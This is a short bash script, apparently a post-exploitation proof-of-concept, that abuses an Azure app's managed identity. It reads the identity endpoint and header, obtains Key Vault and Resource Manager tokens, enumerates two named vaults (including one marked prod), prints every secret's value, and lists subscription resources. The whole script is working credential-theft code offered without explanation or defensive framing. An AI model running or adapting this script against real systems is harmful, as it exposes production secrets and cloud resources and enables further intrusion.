#!/usr/bin/env bash
set -uo pipefail
echo "=== APP PROOF ==="; id; hostname; pwd
E="${IDENTITY_ENDPOINT:-${MSI_ENDPOINT:-}}"; H="${IDENTITY_HEADER:-${MSI_SECRET:-}}"
echo "EP=$E HDRLEN=${#H}"
T=$(curl -s "$E?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $H")
echo "MITOK=$T"
tok=$(printf '%s' "$T" | jq -r '.access_token // empty')
echo "TOKLEN=${#tok}"
if [ -n "$tok" ]; then
 for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  L=$(curl -s -H "Authorization: Bearer $tok" "https://$V.vault.azure.net/secrets?api-version=7.4"); echo "KVLIST $V: $(printf '%s' "$L"|head -c 800)"
  for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do echo "SECRET $V/$(basename "$id"): $(curl -s -H "Authorization: Bearer $tok" "$id?api-version=7.4")"; done
 done
fi
T2=$(curl -s "$E?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $H")
tok2=$(printf '%s' "$T2" | jq -r '.access_token // empty'); echo "ARMLEN=${#tok2}"
[ -n "$tok2" ] && echo "RES: $(curl -s -H "Authorization: Bearer $tok2" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01"|head -c 400)"
echo "=== INNER DONE ==="
